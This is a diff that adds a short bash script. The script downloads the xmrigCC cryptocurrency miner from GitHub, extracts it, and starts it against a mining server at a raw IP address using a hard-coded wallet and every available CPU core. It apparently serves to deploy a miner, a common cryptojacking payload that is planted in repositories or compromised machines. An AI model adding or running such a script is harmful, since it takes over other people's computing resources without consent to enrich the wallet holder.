@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz
+tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz
+./miner/xmrigDaemon -o 134.122.78.130:443 -u SaLvs8cbsyHS6v4m9pSVvGiYspHfb5XwcbDJPE4ZbggW4NTRMRhiAVjhZodTySmCTRTivosFrSayVD7LHkCJXmdgXsY3gsgYsGY -p molor -k -a randomx -t $(nproc --all) 
